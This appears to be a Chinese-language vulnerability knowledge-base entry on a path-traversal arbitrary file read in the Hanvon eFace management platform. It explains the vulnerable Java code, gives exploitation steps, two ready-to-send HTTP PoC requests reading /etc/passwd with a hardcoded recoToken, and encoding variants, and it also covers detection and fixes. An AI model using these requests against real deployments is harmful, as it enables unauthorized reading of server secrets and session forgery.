---
id: web-generic-file-inclusion-hanvon-eface-filepath-fileinputstream
title: 汉王e脸通 filePath 拼接任意文件读取：imgDownload 与 exportResourceByFilePath 直接回显
type: scenario
domain: web
path: web/generic/file-inclusion
technique: filepath-concat-fileinputstream-response-read
aliases:
- 汉王e脸通任意文件读取
- imgDownload 文件读取
- exportResourceByFilePath 文件读取
- filePath 路径穿越
- FileInputStream 回显
tags:
- web
- java
- file-read
- path-traversal
- fileinputstream
- hanvon
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T07:00:12+08:00'
  notes: 已对照原文与图26-27核对：imgDownload fullPath=getCaptureDirectoryPhysicalPath()+filePath→FileInputStream→image/*回显；exportResourceByFilePath path=getRootPath('')+filePath→new File().exists()→FileInputStream→attachment回显；无basename/..过滤；PoC URL与原文一致；原文未给/etc/passwd响应截图
---

## 一句话结论

汉王e脸通的 `ResourceUploadController.imgDownload` 与 `LeaveListController.exportResourceByFilePath` 把请求参数 `filePath` 直接拼到物理根路径后交给 `new FileInputStream`，读取内容原样写入 HTTP 响应；攻击者传入 `../../../../etc/passwd`（并携带可用 `recoToken`）即可未授权读取服务器任意文件。

## 原理

- 第一处 `imgDownload(@RequestParam(required=true) String filePath)`：`fullPath = PhotoStoreUtils.getCaptureDirectoryPhysicalPath() + filePath`，随后 `new FileInputStream(fullPath)`，读到 `byte[]` 后设置 `Content-Type: image/*` 并写出响应；没有对 `filePath` 做 basename、`..` 过滤或规范化后前缀校验。
- 第二处 `exportResourceByFilePath(@RequestParam(required=false, value="filePath") String filePath)`：`path = TheApp.getRootPath("")`，`photoPath = path + filePath`，`new File(photoPath).exists()` 为真时 `new FileInputStream(photoPath)`，循环读出并写入响应，`Content-Disposition: attachment;filename="..."`。
- 两处都是“根路径字符串 + 用户输入”的直接拼接，`../` 会按文件系统语义跳出根目录；`getRootPath`/`getCaptureDirectoryPhysicalPath` 返回的绝对路径不构成安全边界。
- 由于读取结果直接回显（图片流或附件流），攻击者无需二次落地即可拿到文件内容，属于完整的任意文件读取原语。
- 鉴权方面，PoC 携带 `recoToken=67mds2pxXQb`，该 token 可通过本文章中的 recoToken 伪造或从请求中获取；若接口在白名单路径下也可配合 `..;/` 绕过。

## 触发条件

- 目标为汉王e脸通综合管理平台（文章基于反编译源码审计，未标注具体版本）。
- `imgDownload.do` / `exportResourceByFilePath.do` 可达，且能提供有效 `recoToken` 或通过白名单绕过。
- 目标进程对要读取的文件有读权限；`exportResourceByFilePath` 还要求 `new File(photoPath).exists()` 为真。
- 无路径白名单、`..` 过滤或 `startsWith` 根目录校验。

## 利用步骤

1. 选择入口：`/resourceUpload/imgDownload.do` 或 `/leaveList/exportResourceByFilePath.do`。
2. 在 `filePath` 中构造相对穿越路径，如 `../../../../etc/passwd`、`../../../../WEB-INF/web.xml`、`../../../../proc/self/environ`。
3. 携带 `recoToken`（伪造或已知值）发送请求。
4. 响应体即文件内容；`imgDownload` 以图片类型返回，`exportResourceByFilePath` 以附件下载返回。
5. 可继续读取数据库配置、密钥文件、日志与源码，为后续利用提供信息。

## PoC

第一处：

```http
GET /resourceUpload/imgDownload.do?filePath=../../../../etc/passwd&recoToken=67mds2pxXQb HTTP/1.1
Host: <target>
```

第二处：

```http
GET /leaveList/exportResourceByFilePath.do?filePath=../../../../etc/passwd&recoToken=67mds2pxXQb HTTP/1.1
Host: <target>
```

原文截图确认两处均为 `根路径 + filePath` 后 `new FileInputStream` 读取并写响应；未给出 `/etc/passwd` 的实际响应截图。

## 变体与关联

- 路径变体：Windows 目标可用 `..\..\..\..\windows\win.ini` 或盘符路径；Linux 可读 `/etc/passwd`、`/proc/self/environ`、应用配置文件、数据库文件。
- 编码变体：`%2e%2e%2f`、双写 `....//`，取决于容器/框架解码顺序。
- 关联：读取 `encrypt.jar`/配置可获得 globalToken/recoToken 的 DES 密钥，进而伪造管理员会话；读取数据库配置可扩大影响。
- 同类：MES 下载接口 fileName 拼接、金盘 download.jsp items 参数穿越、CRM getFile fileName 拼接。

## 检测与防御

- 修复：对 `filePath` 只接受服务端生成的相对 ID，或用 `Path.resolve` 后 `normalize` 并校验结果位于允许根目录内；禁止把用户输入直接拼接到绝对路径。
- 检测：请求参数含 `../`、`..%2f`、`%2e%2e`、`/etc/passwd`、`WEB-INF` 等；下载接口返回非预期 MIME/大体积文本；同一 token 高频读取不同路径。
- 加固：文件读取接口统一鉴权；读取目录与 Web 根分离；错误信息不回显绝对路径；最小权限运行。
